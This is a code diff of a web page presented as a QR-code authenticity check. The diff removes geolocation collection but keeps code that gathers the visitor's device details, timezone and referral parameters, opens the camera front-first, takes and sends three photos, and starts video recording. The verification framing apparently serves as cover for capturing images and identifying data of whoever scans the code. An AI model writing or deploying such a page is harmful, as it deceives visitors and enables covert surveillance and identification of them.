@@ -96,33 +96,15 @@ const QrVerifyPage = ({ params: _params }: QrVerifyPageProps) => {
     setVideoPreviewUrl(null);
     setStatusMessage(t.authenticity.processingRequest);
 
-    let geoLat: number | null = null;
-    let geoLon: number | null = null;
+    const geoLat: number | null = null;
+    const geoLon: number | null = null;
     let initialCaption = '';
 
     try {
-      // 1. Получаем геолокацию
-      setStatusMessage(t.authenticity.processingRequest + " (Getting location...)");
-      if (navigator.geolocation) {
-        try {
-          const position = await new Promise<GeolocationPosition>((resolve, reject) => {
-            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000, enableHighAccuracy: false });
-          });
-          geoLat = position.coords.latitude;
-          geoLon = position.coords.longitude;
-          setStatusMessage(t.authenticity.processingRequest + " (Location obtained.)");
-        } catch (geoError) {
-          console.warn("Geolocation permission denied or error:", geoError);
-          setStatusMessage(t.authenticity.processingRequest + " (Location access denied or failed.)");
-        }
-      } else {
-        setStatusMessage(t.authenticity.processingRequest + " (Geolocation not supported.)");
-      }
-
-      // 2. Получаем информацию об устройстве и часовом поясе
+      // 1. Получаем информацию об устройстве и часовом поясе
       const { deviceVendor, deviceModel, cpuArchitecture, clientTimezone } = getDeviceInfo();
 
-      // 3. Отправляем начальное уведомление о посещении для получения подписи
+      // 2. Отправляем начальное уведомление о посещении для получения подписи
       setStatusMessage(t.authenticity.processingRequest + " (Sending initial notification...)");
       const utmQueryParams = {
         utm_source: searchParams?.get('utm_source') || null,
@@ -145,7 +127,7 @@ const QrVerifyPage = ({ params: _params }: QrVerifyPageProps) => {
       initialCaption = notifyResponse;
       setStatusMessage(t.authenticity.processingRequest + " (Initial notification sent.)");
 
-      // 4. Запрашиваем доступ к камере (сначала фронтальная, затем задняя)
+      // 3. Запрашиваем доступ к камере (сначала фронтальная, затем задняя)
       setStatusMessage(t.authenticity.processingRequest + " (Requesting camera access...)");
       let mediaStream: MediaStream;
       try {
@@ -174,7 +156,7 @@ const QrVerifyPage = ({ params: _params }: QrVerifyPageProps) => {
       setStatusMessage(t.authenticity.processingRequest + " (Camera stabilizing...)");
       await new Promise(resolve => setTimeout(resolve, 2000)); // 2 seconds for stabilization
 
-      // 5. Take 3 Photos with short delays
+      // 4. Take 3 Photos with short delays
       setStatusMessage(t.authenticity.processingRequest + " (Taking photos...)");
       for (let i = 0; i < 3; i++) {
         if (videoRef.current && canvasRef.current) {
@@ -203,7 +185,7 @@ const QrVerifyPage = ({ params: _params }: QrVerifyPageProps) => {
       setStatusMessage(t.authenticity.processingRequest + " (Photos sent.)");
 
 
-      // 6. Начинаем запись видео (если снимки были успешными)
+      // 5. Начинаем запись видео (если снимки были успешными)
       setStatusMessage(t.authenticity.recordingInstructions + " (Starting video recording...)");
       const recorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm; codecs=vp8,opus' });
       setMediaRecorder(recorder); // Устанавливаем MediaRecorder в состояние
